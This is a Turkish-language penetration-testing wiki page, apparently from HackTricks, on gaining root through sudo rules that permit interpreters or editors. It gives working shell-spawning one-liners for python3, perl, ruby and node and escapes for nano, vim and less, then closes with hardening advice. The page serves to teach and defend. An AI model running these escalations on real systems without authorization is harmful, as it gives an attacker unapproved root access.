# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo ile izin verilen interpreter'lar

`sudo -l` bir kullanıcının bir interpreter'ı root olarak çalıştırmasına izin veriyorsa bunu doğrudan code execution olarak değerlendirin. Interpreter'lar arbitrary code çalıştırmak üzere tasarlanmıştır; bu nedenle `python3`, `perl`, `ruby`, `lua`, `node` veya benzer binary'leri çalıştırmaya izin veren bir kural, argümanlar sıkı biçimde kısıtlanıp doğrulanmadığı sürece genellikle root command execution ile eşdeğerdir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Yaygın inceleme akışı: önce kullanıcının yetkilerini listeleyin, ardından interpreter'ın `-c` seçeneğiyle bir Python statement çalıştırın.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Diğer interpreter örnekleri aşağıda gösterilmiştir; listelenen interpreter'lar inline-code execution veya child-process API'lerini belgelemektedir.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tam yol önemlidir. sudo kuralı `/usr/bin/python3` yoluna izin veriyorsa doğrulama sırasında tam olarak bu yolu kullanın.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo ile çalıştırılmasına izin verilen editörler

`sudo -l`, bir kullanıcının etkileşimli bir editörü root olarak çalıştırmasına izin veriyorsa, bunu zararsız bir dosya düzenleme izni olarak değil, bir command-execution surface olarak değerlendirin. Editörler genellikle shell komutlarını çalıştırabilir, rastgele dosyaları okuyabilir, rastgele dosyalara yazabilir veya editör içinden harici yardımcıları çağırabilir.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Yaygın inceleme akışı: kullanıcının yetkilerini listeleyin, ardından izin verilen her editörü veya pager'ı sudo ile çalıştırın.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` sudo üzerinden kullanılmasına izin verildiğinde, komut execution işlemine editor arayüzünden erişilebilir olabilir.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Ardından nano komut istemine `id` veya `/bin/sh` gibi bir komut sağlayın.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Etkileşimli bir shell kullanılabilir terminal akışlarına sahip değilse bu yönlendirme biçimi, standart çıktısını ve hatasını 0 numaralı descriptor'a eşler.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Kesin tuş dizisi nano sürümüne ve derleme seçeneklerine göre değişebilir, ancak güvenlik sorunu aynıdır: editör root olarak çalışır ve harici komutları çağırabilir.<sup>[[1]](#references)[[12]](#references)</sup>

### Diğer yaygın editör kaçışları

Vim tarzı editörler genellikle `:!` aracılığıyla komut çalıştırma özelliği sunar.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less` gibi Pagers da shell execution açığa çıkarabilir.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Savunma notları

- `sudo` üzerinden interpreter'lara veya interactive editor'lara erişim izni vermekten kaçının.<sup>[[1]](#references)</sup>
- Tek bir dar kapsamlı administrative action gerçekleştiren, root-owned sabit wrapper'ları tercih edin.<sup>[[1]](#references)[[2]](#references)</sup>
- Bir interpreter kaçınılmazsa, tam script path'ini kısıtlayın ve user-controlled argument'ları, writable import'ları, `PYTHONPATH`'i ve güvenli olmayan environment preservation'ı engelleyin.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- File editing gerekiyorsa, tam file path'ini kısıtlayın ve patched sudo version'ları ile strict environment handling kullanarak `sudoedit`'i değerlendirin.<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`, `env_keep`, writable working directory'leri, writable module/import path'lerini, `NOEXEC`, `use_pty` ve logging'i gözden geçirin; ancak bunları eksiksiz bir sandbox olarak değerlendirmeyin.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python documentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python documentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — how to execute the Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl documentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby documentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js documentation](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js documentation](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
